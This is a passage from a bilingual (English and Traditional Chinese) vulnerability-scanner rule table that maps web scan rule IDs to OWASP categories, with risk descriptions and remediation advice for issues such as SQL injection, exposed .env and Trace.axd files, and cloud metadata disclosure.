•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40023,A1,Possible Username Enumeration,TRUE,,,,,,,,
40024,A3,SQL Injection - SQLite,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions perform other checks.
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied.
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40025,A1,Proxy Disclosure,TRUE,Medium,Medium,Insecure HTTP Method： TRACE,不安全的HTTP方法（Trace）,"We detected that your website allows the HTTP TRACE or 
TRACK method, which leaks the technology and version information of deployed servers. This information may help an attacker identify potentially exploitable server versions and unnecessarily open ports for further attacks. If there exists an out-of-date of unpatched server, an attacker may leverage such vulnerabilities to exploit external services. The TRACE method is often used for debugging purposes, as the server returns in the response all the information it received. This includes cookies, credentials, and other information on the frontend and backend. If the request passed through any proxy servers which may add headers, the TRACE response will also include those. In addition, since the TRACE method reflects the original request, it may be used with cross-domain scripting attacks, resulting in Cross Site Tracing (CST) attacks",檢測到您的網站服務器允許使用 TRACE 方法，該方法會洩漏已部署的伺服器技術和版本消息導致產生安全風險。 例如攻擊者在TRACE後發現有漏洞的Server版本或是該Server開啟了不必要的port導致私密的Server可以被攻擊者訪問，進而導致攻擊的發生。​ 除此之外，駭客也可以利用返回的資訊了解伺服器技術和版本資訊，進一步列出攻擊目標列表與漏洞，若伺服器中存在過期或未修補的服務，則將被駭客進一步滲透。 TRACE 方法是 HTTP 定義的一種協議除錯方法，該方法使得伺服器原樣返回任何用戶請求的內容，包含前後端資訊、 cookie、或身份驗證資料等敏感資訊以及附加的路由中間的代理伺服器的資訊，由於該方法原樣返回用戶提交的任意資料，因此可用來進行跨域腳本攻擊。這種攻擊方式又稱為跨域跟蹤攻擊（XST），可能導致帳戶盜用、資料外洩。,"• Disable the 'TRACE' method on the proxy servers, as well as the origin web/application server. 
• Disable the 'OPTIONS' method on the proxy servers, as well as the origin web/application server, if it is not required for other purposes, such as 'CORS' (Cross Origin Resource Sharing). 
• Configure the web and application servers with custom error pages, to prevent 'fingerprintable' product-specific error pages being leaked to the user in the event of HTTP errors, such as 'TRACK' requests for non-existent pages. 
• Configure all proxies, application servers, and web servers to prevent disclosure of the technology and version information in the 'Server' and 'X-Powered-By' HTTP response headers.","• 建議在代理伺服器以及原始Web /應用程序伺服器上禁用TRACE method。​ 
• 建議在代理伺服器以及原始Web /應用程序伺服器上禁用OPTIONS method，防止攻擊者藉由OPTIONS的查詢來檢查網站是否支援TRACE。​ 
• 如果已禁用TRACE method，建議在網站中使用自定義錯誤頁面，防止攻擊者往不存在的頁面發送TRACE請求時，預設的錯誤頁面洩露過多資訊。"
40026,A3,Cross Site Scripting (DOM Based),TRUE,,,,,,,,
40027,A3,SQL Injection - MsSQL,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions perform other checks.
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied.
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•使用資料庫或第三方套件提供的參數化查詢接口，避免直接拼接 SQL 查詢語法。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40028,A3,ELMAH Information Leak,TRUE,Medium,Low,Information Leak：Trace.axd ,資料揭露（Trace.axd文件）,"We detected that your website leaks the Trace.axd file, which may disclose an significant amount of information, including business logic, credentials, session cookies, or other sensitive data. To view diagnostic information and tracing messages in an ASP.NET web application, developers may enable tracing to follow a page's execution path and additional debugging information, which is then exported to a Trace.axd file. Developers can then display this file using a Trace Viewer to investigate errors. However, this file should be hidden or removed from production stages.","檢測到您的網站有Trace.axd文件揭露的安全風險。
常見於文件未隱藏而使攻擊者探尋到後根據文件利用資訊洩漏包括業務邏輯，憑證，session cookie或其他敏感數據等進行攻擊。 Trace.axd是為了ASP.NET Web應用程序中查看診斷信息和跟蹤消息，開發人員可以啟用使其遵循頁面的執行路徑和其他調試訊息，進而導出到Trace.axd文件使開發人員可查看此文件以調查錯誤。","• Hide or remove Trace.axd in production stages. 
• Disable the Trace Viewer unless it is actually required in development. Ensure access to it requires authentication and authorization. 
• To disable ASP.NET tracing, apply the following changes to your web.config file： <System.Web> <trace enabled=""""false"""" /> </System.Web>","• 應將此文件隱藏或從生產階段中刪除，因為它可能洩漏大量信息。 
• 請考慮研發過程中是否實際需要Trace Viewer，如果不需要，則將其禁用。 
• 若不禁用，請確保任何人進行存取時需要身份驗證和授權。 要禁用ASP.NET跟踪，請將以下更改應用於web.config文件： <System.Web> <trace enabled=""""false"""" /> </System.Web>。"
40029,A1,Trace.axd Information Leak,TRUE,,,,,,,,
40032,A3,.htaccess Information Leak,TRUE,Medium,Low,Information Leak：.htaccess,資料揭露（.htaccess 文件）,htaccess files can be used to alter the configuration of the Apache Web Server software to enable/disable additional functionality and features that the Apache Web Server software has to offer.,檢測到您的網站可能有.htaccess文件揭露的風險。 .htaccess文件是用於記錄及更改Apache Web Server的配置＆啟用或禁用Apache Web Server中的其他功能。 因此攻擊者一但拿到此文件便可能從中獲取Server配置進行針對性的攻擊以及從中獲取機敏資料（遠端IP位置、遠端URL等）,Ensure the .htaccess file is not accessible. ,"• 確認網站上.htaccess 檔案的存取權限，確保使用者無法下載.htaccess 。
• 設定完成後以報告中路徑測試，再次確認使用者無法存取檔案"
40034,A1,.env Information Leak,TRUE,Medium,Low,Information Leak：.env,資料揭露（.env文件）,"One or more .env files seems to have been located on the server. These files often expose infrastructure or administrative account credentials, API or APP keys, or other sensitive configuration information.",檢測到您的網站有.env文件揭露的風險，這可能導致敏感資訊外洩，因為此類型文件通常保管網頁基礎結構架構或管理帳戶憑證或其他敏感配置信息。,Ensure the .env file is not accessible.,• 確認掃描報告中列出的文件，確認此文件有公開的必要，否則則移除此類型文件，確保資料沒有洩漏的風險。
40035,A1,Hidden File Finder,TRUE,,,,,,,,
50000,Other,Script Active Scan Rules,TRUE,,,,,,,,
50001,Other,Script Passive Scan Rules,TRUE,,,,,,,,
50003,Other,Stats Passive Scan Rule,TRUE,,,,,,,,
90001,A4,Insecure JSF ViewState,TRUE,,,,,,,,
90011,Other,Charset Mismatch,TRUE,,,,,,,,
90017,A3,XSLT Injection,TRUE,Medium,Medium,XSLT Injection,XSLT注入攻擊,"Injection using XSL transformations may be possible, and may allow an attacker to read system information, read and write files, or execute arbitrary code.","檢檢測到您的網站可能有XSLT注入攻擊的風險。
常見於應用程序允許上傳任意XSLT文件，且未設置好針對使用者的輸入進行驗證，導致XSLT轉換時將使用者輸入內容變成指令注入，因而使讓攻擊者遠程取得儲存在本地Web Server中的文件內容，可能是包含了憑證資訊配置或敏感訊息的文件等。 XSLT是一種可以將XML資料檔轉換為另外的XML或其它格式如HTML網頁、純文字的語言。而XSLT 注入風險通常是因為未設置好針對使用者的輸入進行驗證，因而導致風險發生。",Sanitize and analyze every user input coming from any client-side.,"• 盡量不使用使用者提供的XSLT檔案匯入 。
• 網站中的輸入欄位針對XSLT語法進行過濾 。"
90019,A3,Server Side Code Injection,TRUE,,,,,,,,
90020,A3,Remote OS Command Injection,TRUE,High,Medium,Remote OS Command Execution,系統命令遠端執行,"Attack technique used for unauthorized execution of operating system commands. This attack is possible when an application accepts untrusted input to build operating system commands in an insecure manner involving improper data sanitization, and/or improper calling of external programs.Attack technique used for unauthorized execution of operating system commands. This attack is possible when an application accepts untrusted input to build operating system commands in an insecure manner involving improper data sanitization, and/or improper calling of external programs.",檢測到您的網站可能使攻擊者遠端執行系統命令在作業系統上。常見於攻擊者透過表單、Cookie、Http表頭等位置嘗試將系統命令注入作業系統，導致系統崩潰中斷服務或是竊取資料建立後門等。 此種攻擊除了因為系統的設置不當或權限設定不明確以外，通常也代表網站針對使用者的輸入驗證不足，導致攻擊者可以成功遠端執行系統指令。 ,"If at all possible, use library calls rather than external processes to recreate the desired functionality. Run your code in a 'jail' or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software.","• 做好輸入驗證與檢查，不論是前後端都應假設輸入都是惡意且不可信任的 
• 檢查文法與語意，應確認每個輸入欄位是否為合理的資料類型與內容，例如年齡的欄位在文法上應只接受0-9的數字，而語意上應確認此數字介於 0-120。 
• 難以定義文法的自由格式，都應經由編碼轉義為純字符串來處理，防止此內容被視為程式碼執行。許多程式框架都有提供內建編碼函式庫，可多加利用。"
90021,A3,XPath Injection,TRUE,,,,,,,,
90022,A1,Application Error Disclosure,TRUE,Medium,Medium,Error Message Leakage,錯誤信息揭露,"We detected that your website leaks error messages with detailed descriptions. This vulnerability may disclose sensitive information like the location of the file that produced the unhandled exception and the internal logic of the source code. Attackers may use this information to fingerprint and launch further attacks against the web application, such as substituting existing files to execute malicious code. The alert could be a false positive if the error message is found inside a documentation page.","檢測到您的網站頁面包含一條錯誤/警告消息，該消息可能會洩露敏感信息，造成安全風險。 例如發現紀錄異常的文件位置，內容包含網頁結構及資料夾名稱，導致攻擊者可藉此針對網頁進行資料探尋、替換等攻擊行為。 錯誤信息可用於對網頁應用程序發起進一步的攻擊。 
如果在網頁文字內容中有含錯誤消息等關鍵字，可能導致本項目產生誤報。","• Review the source code of this page. 
• Implement custom error pages. Consider implementing a mechanism to provide a unique error reference/identifier to the client (browser) while logging the details on the server side and not exposing them to the user.","• 查看此頁面的原始碼，並自定義錯誤頁面。 
• 當發生錯誤時將資料（錯誤參考碼/識別碼）記錄在伺服器端，而不向用戶公開。"
90023,A5,XML External Entity Attack,TRUE,,,,,,,,
90024,A4,Generic Padding Oracle,TRUE,Medium,Low,Error Message Containing Sensitive Information,錯誤訊息中包含敏感資訊,"By manipulating the padding on an encrypted string, an attacker is able to generate an error message that indicates a likely ‘padding oracle’ vulnerability. Such a vulnerability can affect any application or framework that uses encryption improperly, such as some versions of ASP.net, Java Server Faces, and Mono. An attacker may exploit this issue to decrypt data and recover encryption keys, potentially viewing and modifying confidential data. This rule should detect the MS10-070 padding oracle vulnerability in ASP.net if CustomErrors are enabled for that.","檢測到您的網站可能有錯誤訊息中包含敏感資訊的可能。
常見於引用的某些版本應用程序或框架的加密不正確或是版本過舊，導致當攻擊者針對應用程序或框架進行密文填充的溢位攻擊時，錯誤訊息中包含了敏感資訊的洩漏。","Update the affected server software, or modify the scripts so that they  properly validate encrypted data before attempting decryption.","• 將顯示的錯誤訊息隱藏確保攻擊者無法查看錯誤訊息中的敏感資訊。
• 將顯示錯誤訊息的應用程序或框架版本更新至最新或安全的穩定版本。 "
90025,A3,Expression Language Injection,TRUE,,,,,,,,
90026,Other,SOAP Action Spoofing,TRUE,,,,,,,,
90027,A1,Cookie Slack Detector,TRUE,Low,Low,Cookies Not Enforced,未被採用的 cookie,"Repeated GET requests： drop a different cookie each time, followed by normal request with all cookies to stabilize session, compare responses against original baseline GET. This can reveal areas where cookie based authentication/attributes are not actually enforced.",檢測到您的網站實際上未執行Cookie，使網站缺乏預期的驗證功能。 這可能導致攻擊者在不被驗證的情況下存取需執行身份驗證範圍的資訊。,Check the report for the area that actually performs the cookie verification function,• 檢查報告列表中為實際執行Cookie驗證功能的區域。
90028,A1,Insecure HTTP Method,TRUE,,,,,,,,
90029,Other,SOAP XML Injection,TRUE,,,,,,,,
90030,A5,WSDL File Detection,TRUE,,,,,,,,
90033,A8,Loosely Scoped Cookie,TRUE,,,,,,,,
90034,Other,Cloud Metadata Potentially Exposed,TRUE,Medium,Medium,Cloud Metadata Disclosure,雲端中繼資料洩漏,"The Cloud Metadata Attack attempts to abuse a misconfigured 
NGINX server in order to access the instance metadata maintained by cloud service providers such as AWS, GCP and Azure. All of these providers provide metadata via an internal unroutable IP address ‘169.254.169.254’ - this can be exposed by incorrectly configured NGINX servers and accessed by using this IP address in the Host header field.",檢測到您的網站可能因為Nginx的配置錯誤導致雲端上的中繼資料洩漏。 常見於Nginx的配置過於寬鬆使攻擊者可以透過Nginx訪問原先沒有權限存取的Server進而使AWS，GCP和Azure等雲服務提供商的中繼資料洩漏，中繼資料可能是檔案種類和其它技術資訊，以及誰有權限存取,Do not trust any user data in NGINX configs. In this case it is probably the use of the $host variable which is set from the 'Host' header and can be controlled by an attacker.,"• 將流量代理到已知上游Server，通過IP地址或DNS名稱來標識Server進行過濾。 
• 在NGINX配置中或使用Web應用程序防火牆（WAF），將所有帶有異常標頭值的請求丟棄。"
